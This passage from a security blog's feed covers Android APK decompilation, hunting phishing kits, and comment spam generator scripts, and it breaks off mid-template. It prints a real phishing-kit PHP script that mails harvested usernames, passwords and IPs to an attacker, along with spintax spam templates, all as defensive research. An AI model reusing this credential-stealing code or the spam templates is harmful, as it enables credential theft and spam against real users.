<h3>Introduction</h3>

<p>Mobile applications are often viewed as black-box applications. However, these applications often suffer from the same (or similar) vulnerabilities as their web application counterparts.</p>

<p>In a <a href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/">previous post</a>, I showed how we can perform dynamic analysis on iPhone applications by intercepting the inbound/outbound traffic with the Burp proxy. In this post, we&rsquo;ll explore static analysis of Android apps by looing at a couple of online tools that make decompiling apps into equivalent Java and Smali code trivial.</p>

<!-- more -->


<h3>Step One: Get the APK</h3>

<p>The first step in analyzing an Android app is to get the actual APK that&rsquo;s loaded onto the device. Fortunately, there is a site called <a href="http://apps.evozi.com/apk-downloader/">APK Downloader</a> which allows us to do just that. By getting the link to the app of your choice from the <a href="https://play.google.com/store/apps?hl=en">Google Play Store</a> and pasting it into APK Downloader, you can download a local copy of the app APK.</p>

<h3>Step Two: Unpack and Decompile</h3>

<p>After we have the APK, we need to unpack and decompile the contents into its equivalent Java code. This used to be a pretty lengthy process using tools such as the <a href="https://code.google.com/p/android-apktool/">android apktool</a>. Fortunately for us, someone has also setup a web-based service which automatically performs the decompilation process on a given APK.</p>

<p>By uploading the APK to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>, the user will be presented with the option to download the decompiled contents of the app, including the Java source code. <em>Awesome.</em></p>

<h3>Things to Look For</h3>

<p>Decompiling Android apps can allow researchers to analyze the exact code that is running on the app for vulnerabilities, as well as reveal any hardcoded credentials or other sensitive data. For example, in June of 2014, researchers from Columbia university created a tool called <a href="https://github.com/nviennot/playdrone">PlayDrone</a> which automatically crawled thousands of Android apps found on the Google Play store and <a href="http://www.cs.columbia.edu/~nieh/pubs/sigmetrics2014_playdrone.pdf">discovered the existence of sensitive credentials</a> in many of them.</p>

<h3>Conclusion</h3>

<p>Hopefully this short post not only shows researchers how to easily decompile Android apps, but also sends a gentle reminder to app developers that the source code of the app can easily be recovered. As such, precautions should be taken to ensure there is no sensitive information &ldquo;hidden in plain sight&rdquo;. As always, leave any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Hunt Down Phishing Kits]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/"/>
    <updated>2014-07-30T22:12:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/phishing_kit.png"/></p>

<h3>Introduction</h3>

<p>Sites like <a href="http://www.phishtank.com/phish_archive.php">phishtank</a> and <a href="http://support.clean-mx.com/clean-mx/phishing.php">clean-mx</a> act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find <a href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/">interesting information</a> about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how <em>phishing kits</em> are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.</p>

<!-- more -->


<h3>How Phishing Kits Work</h3>

<p>To perform a phishing attack, attackers commonly employ prebuilt <em>phishing kits</em>. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
</span><span class='line'>        <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location:file_doc.php&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="k">exit</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nb">session_destroy</span><span class="p">();</span>
</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$ip</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">);</span>
</span><span class='line'><span class="nv">$country</span> <span class="o">=</span> <span class="nx">visitor_country</span><span class="p">();</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;-------Moded by Ghost Wir3 ----------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Username: &quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Password : &quot;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;IP: &quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Country: &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$recipient</span> <span class="o">=</span> <span class="s2">&quot;[redacted]@gmail.com&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&quot;Ghost Wir3 - &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="p">;</span>
</span><span class='line'><span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&quot;From:  Ghost Wir3 &lt;no_reply@mail.com&gt;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eMailAdd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">$arr</span> <span class="o">=</span> <span class="nx">country_sort</span><span class="p">();</span>
</span><span class='line'><span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$recipient</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>        <span class="nb">mail</span><span class="p">(</span><span class="nv">$recipient</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message</span><span class="p">,</span><span class="nv">$headers</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>In this example, to reuse the phishing kit, an attacker simply needs to change the <code>$recipient</code> variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).</p>

<h3>How to Find Phishing Kits</h3>

<p>We&rsquo;ve seen that these kits generally require the credentials to be processed by server-side code. Unless there is a misconfiguration on the server, we will not be able to view this code, only that credentials are being passed to it.</p>

<p>However, with that being said, <em>many attackers are <strong>lazy</strong></em>. I&rsquo;ve seen from experience that the original zip file containing the phishing kit is often left on the server, and can be downloaded to reveal the server-side source code. Additionally, the directories hosting the phishing kits often have indexing enabled, making it easier for us to see the files in the directory. This same technique has also <a href="https://www.usenix.org/legacy/events/woot08/tech/full_papers/cova/cova.pdf">been used previously by researchers</a> with success.</p>

<p><img src="http://jordan-wright.github.io/images/blog/phish_kits/directory_index.png"/></p>

<p>Knowing this, we can send requests for common archive extensions automatically in the hopes of finding the original phishing kits. These extensions include things such as .zip, .tar, .tar.gz, and .rar. For example, if the URL found by phishtank or clean-mx is <a href="http://x.x.x.x/apple/index.php,">http://x.x.x.x/apple/index.php,</a> we could send requests for <a href="http://x.x.x.x/apple.zip">http://x.x.x.x/apple.zip</a> with success in many cases.</p>

<p>In some cases, finding the original phishing kit can reveal even more information about the tools and techniques used by attackers. Here&rsquo;s an example of one of those cases.</p>

<h3>A Look into a Compromised Website</h3>

<p>While performing random checks on many of the sites listed on phishtank and clean-mx, I came across one site that had a phishing kit located in the /phpmyadmin directory. When checking the files in the phishing kit, I found reference to a c100.php web shell. Sure enough, this file was still in place on the server:</p>

<p><img src="http://jordan-wright.github.io/images/blog/phish_kits/c100.png" /></p>

<p>PHP backdoors provide substantial access to attackers, facilitating further attacks and control over the compromised server. The c100.php and c99.php backdoors are among the most popular backdoors used by attackers. Through some Googling, we can see that there are <strong>tons</strong> of servers that are compromised using <a href="https://www.google.com/search?q=inurl%3A%22c99.php%22%22AND+filetype%3Aphp+%22!C99Shell%22+AND+%22Software%22">these</a> <a href="https://www.google.com/search?q=inurl%3A%22c100.php%22%22AND+filetype%3Aphp+%22%21C100%22+AND+%22Software%22">shells</a>.</p>

<p>This shell revealed additional scripts (and other webshells) used by the attacker, including (but certainly not limited to!) the following:</p>

<ul>
<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-valider-php">valider.php</a> &ndash; The credential caching script</li>
<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wpbrute-php">wpbrute.php</a> &ndash; A Wordpress brute forcing script</li>
<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wso-php">wso.php</a> &ndash; Another web shell</li>
</ul>


<h3>Fellow Phish Hunters</h3>

<p>In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">428</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">432</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/update.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/us.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">443</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">446</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a <strong>substantial</strong> number of requests for common files to be found on phishing kits. I&rsquo;ll likely parse these out and make another blog post with the full list for those interested.</p>

<h3>Conclusion</h3>

<p>Hopefully this post not only shows a few of the interesting pieces of information we can find when investigating servers used for phishing campaigns, but also that there is still an incredible amount of work to be done in identifying threat actors behind phishing campaigns. As always, let me know if you have any questions or comments below!</p>

<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Look at Comment Spam Generator Scripts]]></title>
    <link href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/"/>
    <updated>2014-04-04T14:33:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/spam_gen.png"/></p>

<h3>Introduction</h3>

<p>It&rsquo;s been a while! I&rsquo;ve been busy getting <a href="http://github.com/jordan-wright/gophish">gophish</a> closer and closer to beta. Should be ready soon!</p>

<p>Until then, here&rsquo;s a quick look at some comment spam scripts I discovered when perusing through the content over at <a href="http://phishtank.com">phishtank.com</a>.</p>

<p><em>As a side note, the scripts were bundled as some Louis Vuitton spam, though that doesn&rsquo;t seem to relate to the content of the spam scripts at all.</em></p>

<h3>The Spam Scripts</h3>

<p>Here are the scripts &ndash; the format looks very similar to <a href="http://alexking.org/blog/2013/12/22/spam-comment-generator-script">those found by Alex King</a>. I&rsquo;m guessing that one choice from each <code>{block}</code> is used at random to make every comment unique.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{Rapper|Rap artist|Artist} {George|Henry} Watsky apologises {for|with regard to|regarding|pertaining to} {breaking|busting|splitting|smashing} {woman|lady|girl|female}
</span><span class='line'>{The|The actual|The particular|Your} {rapper|rap artist|artist} {was|had been|has been|ended up being} {performing|carrying out|executing|undertaking} {at|from|with|in} Alexandra {Palace|Structure|Construction|Development} {in|within|inside|throughout} {north|northern|n .|upper} {London|Birmingham|Greater london|Manchester} {when he|as he|while he|whilst} {climbed|rose|risen|soared} {up the|in the|the|inside the} {stage|phase|period|point} {on a|on the|over a|with a} {rope|string|piece of string|line} {before|prior to|just before|ahead of} {launching|starting|introducing|establishing} {himself|themself|themselves|herself} {onto the|to the|on the|on top of the} {audience|target audience|viewers|market} {from|through|coming from|via} 30ft.
</span><span class='line'>{In a|Inside a|In the|Within a} {lengthy|extended|prolonged|long} {post|publish|submit|article} {on|upon|about|in} {his|their|his / her|his or her} {Facebook|Fb|Myspace|Facebook or myspace} {page|web page|site|web site}, Watsky apologised {for|with regard to|regarding|pertaining to} {his|their|his / her|his or her} {stunt|stop|trick} {and|as well as|and also|along with} {said|stated|mentioned|explained} {he|he or she|this individual|they} {decided to|chose to|made a decision to|thought we would} {jump|leap|hop|bounce} {due to a|as a result of|because of a|because of} "huge overreach {in the|within the|inside the|from the} {heat|warmth|temperature|high temperature} {of the|from the|with the|in the} moment".
</span><span class='line'>{He said|He explained|He was quoted saying|He stated}: "The {jump|leap|hop|bounce} {was not|wasn't|had not been|has not been} {awesome|amazing|great|wonderful}, {it was not|it wasn't|it had not been} badass, {and it|also it|plus it|and yes it} {was not|wasn't|had not been|has not been} ballsy. {It|This|That|The idea} {turned|switched|flipped|transformed} {what|exactly what|just what|precisely what} {should have|must have|needs to have|really should have} {been|already been|recently been|been recently} {a great|an excellent|a fantastic|an incredible} {day|day time|evening|morning} {for the people|for anyone|for those|for people} {who|that|which|whom} {got|obtained|received|acquired} {hurt|harm|damage|injure} {into a|right into a|in to a|in a} {nightmare|headache|problem|pain}. {It was|It had been|It absolutely was|It turned out} {stupid|silly|foolish|ridiculous} {and|as well as|and also|along with} {wildly|extremely|hugely|very} {irresponsible|reckless|uncaring|freewheeling}, {plain and simple|basically|in basic terms|simply}.
</span><span class='line'>"I {pride|satisfaction|delight|pleasure} {myself|personally|me personally|myself personally} {on|upon|about|in} {trying to|attempting to|wanting to|looking to} {put on|placed on|wear|place on} {a good|a great|an excellent|a fantastic} {show|display|present|demonstrate} {and always|and try to|and constantly|try to} {giving|providing|offering|supplying} {100|One hundred|A hundred|Hundred} {per cent|percent|%|per-cent} {energy|power|vitality|electricity}, {but|however|yet|nevertheless} {jumping|leaping|bouncing|moving} {off|away|away from|off of} {some|a few|several|a number of} {high|higher|large|substantial} {st|street|saint|e} {doesn't|does not|will not|won't} {make|help to make|help make|create} {someone|somebody|an individual|a person} {a good|a great|an excellent|a fantastic} {musician|music performer|artist|musician and performer} {or|or even|or perhaps|as well as} {performer|artist|musician|singer}. {I feel|Personally i think|I'm|I am} fing {terrible|horrible|awful|dreadful}. {I|We|My partner and i|My spouse and i} {made a|designed a|developed a|created a} boneheaded {decision|choice|selection|determination} {that|which|in which|that will} {got|obtained|received|acquired} {people|individuals|folks|men and women} {hurt|harm|damage|injure}, {and it's|and it is|and it's really|and} {extremely|very|really|incredibly} {lucky|fortunate|blessed|fortuitous} {it wasn't|it had not been|it was not} {worse|even worse|a whole lot worse|more serious}.{"|Inch|Inches|In .}
</span><span class='line'>{He|He or she|This individual|They} {added|additional|extra|included} {he|he or she|this individual|they} {was not|wasn't|had not been|has not been} {under the influence of|intoxicated by|consuming|ingesting} {drugs or alcohol|alcohol or drugs} {when he|as he|while he|whilst} {performed|carried out|done|executed} {the|the actual|the particular|your} {stunt|stop|trick}, {and|as well as|and also|along with} {said|stated|mentioned|explained} {his|their|his / her|his or her} {health|wellness|well being|wellbeing} {was|had been|has been|ended up being} "fine, {besides|apart from|in addition to|aside from} {some|a few|several|a number of} {nicks|grazes|dings|lacerations}, bruises, {and the|and also the|as well as the|along with the} {shame|pity|disgrace|waste} {of|associated with|regarding|involving} {endangering|risking|threatening} {the|the actual|the particular|your} crowd".
</span><span class='line'>{The|The actual|The particular|Your} {Californian|American} {rapper|rap artist|artist} {said|stated|mentioned|explained} {he had|he'd|he previously|he} {been to|visited|gone to|attended} {hospital|medical center|clinic|healthcare facility} {to visit|to go to|to see|to check out} {the two|the 2|both|both the} {audience|target audience|viewers|market} {members|people|associates|users} {who were|who have been|who had been|have been} {injured|hurt|wounded|harmed}, {and|as well as|and also|along with} {stayed|remained|stayed at|slept} {with them|together|using them|with these} {for|with regard to|regarding|pertaining to} {six hours|6 hours} {until the|before the|before|prior to the} {visiting|going to|browsing|traveling to} {period|time period|period of time|interval} {had|experienced|acquired|got} {ended|finished|concluded|broken}.
</span><span class='line'>{He|He or she|This individual|They} {confirmed|verified|established|validated} {he would|he'd|however|although} {not be|'t be|not|stop} {cancelling|rescheduling|deleting|closing} {his|their|his / her|his or her} {remaining|leftover|staying|outstanding} {six|6|half a dozen|six to eight} {tour|visit|excursion|trip} {dates|times|days|schedules} {in the UK|in the united kingdom|in britain|in england}.
</span><span class='line'>"I {will do|is going to do|can do|will perform} {the|the actual|the particular|your} {shows|exhibits|displays|demonstrates}, {as usual|as always} {I will|I'll|I am going to|Let me} {meet|fulfill|satisfy|meet up with} {everyone|everybody|every person|anyone} {afterwards|later on|soon after|after}, {and I will|and i'll} {NOT be|'t be|Not|Stop} {jumping|leaping|bouncing|moving} {off|away|away from|off of} {anything|something|anything at all|everything}. {I am|I'm|I will be|We are} {deeply|seriously|profoundly|significantly} {sorry|i'm sorry|remorseful|i am sorry} {and I|and that i|and i also|i} {promise|guarantee|assure|offer} {to learn|to understand|to find out|to master} {from this|out of this|using this|because of this} {mistake|error|blunder|oversight},{"|Inch|Inches|In .} {he said|he explained|he was quoted saying|he stated}./p&gt;
</span><span class='line'>
</span><span class='line'>{Police|Law enforcement|Law enforcement officials|Authorities} {find|discover|locate|uncover} {2|Two|A couple of|Only two} {more|much more|a lot more|far more} corpses {in|within|inside|throughout} Surrey
</span><span class='line'>Sgt. {PT|Rehabilitation|Therapist} Wednesdayinan {area of|section of|part of|division of} {South|Southern|To the south|Southerly} Surrey {that has been|that's been|which has been|that is} {used|utilized|employed|utilised} {twice|two times|2 times|double} {this year|this season|this coming year|in 2010} {as a|like a|being a|as being a} {dumping ground|drop zone} {for|with regard to|regarding|pertaining to} {bodies|physiques|body|systems}.{The|The actual|The particular|Your} {integrated|incorporated|built-in|included} {homicide|murder|killing|kill} {investigation|analysis|study|exploration} {team|group|staff|crew} {was|had been|has been|ended up being} {called|known as|referred to as|named} {Wednesday|Thursday|Friday|Wed} {morning|early morning|morning hours|day} {to an|for an|to a|with an} {area of|section of|part of|division of} Colebrook {Road|Street|Highway|Path} {in|within|inside|throughout} Surrey {that has become|that is|that has been|this is certainly} {a|the|any|a new} {dumping ground|drop zone} {for|with regard to|regarding|pertaining to} {bodies|physiques|body|systems}. (CBC){More|Much more|A lot more|Far more} {police|law enforcement|law enforcement officials|authorities} {were|had been|have been|ended up} {then|after that|next|and then} {called 